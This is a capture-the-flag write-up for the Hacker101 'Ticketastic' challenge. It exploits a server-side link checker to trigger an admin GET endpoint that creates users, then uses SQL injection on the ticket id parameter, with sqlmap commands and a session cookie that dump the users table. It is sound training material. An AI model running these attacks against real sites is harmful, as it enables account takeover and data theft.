# Writeup for Ticketastic (Hacker101)
We have a Demo of the site where we could 'test' the product, that consists in a platfrom where an admin can replay to some tickets.

## Flag 1
Logging in with the provided username and password of Demo site on the `/admin` page we see that all the tickets are visible here.
In the description of the first ticket we get the first hint that say:
> This is your ordinary, run of the mill ticket.  If any errors occurred during processing -- 
> for instance, if the user gives a bad link -- these will be noted here.

So there is something that check for malicius url. 
We can exploit that!

Backing to the admin page there is the possibility for the admin to create a new user. If we try to do so we see that the creation is done using a get request. `/newUser?username=<>&password=<>&password2=<>`

So the exploit is pretty simple we have to create a new ticket in the real working site and write in its content the endpoint that creates a new users, then the server will check it and accidentally creates the new user.

It works! When we log in we see the in the first ticket there is the first flag.

## Flag 2
After logged in I try to play a bit with the site, and I see that the retriving of the tickets is done with url query `/ticket?id=1`, and trying to add a quote to the end we see that we get the full stack of an error:
```log
Traceback (most recent call last):
  File "./main.py", line 78, in ticket
    cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, 'You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near \'"\' at line 1')
```
It'seems that we can perform a nice SQL Injection.
I decide to use `sqlmap` but we can expoit it also by hand.
Running:
```bash
sqlmap -u '<url>/ticket?id=1' --cookie="session_level7b=<cookie>" -p 'id' -a
```
In the output we see all the content of the DB, but we aren't interested in all the functional schema of it.
In the list of schema we see the Database level7, that's what we need.

```bash
sqlmap -u '<url>/ticket?id=1' --cookie="session_level7b=<cookie>" -p 'id' --dump -D level7`
```

In the outputs we find:

```
Database: level7
Table: users
[2 entries]
+------+----------+------------------------------------------------------------------------------+
| id   | username | password                                                                     |
+------+----------+------------------------------------------------------------------------------+
| 1    | admin    | ^FLAG^dec3cf71a4a7359272fa8c5176377f6d024e6da40372eb64fbfcab2e05cd3d91$FLAG$ |
| 2    | pwned    | provami                                                                      |
+------+----------+------------------------------------------------------------------------------+
```
And that's the second flag.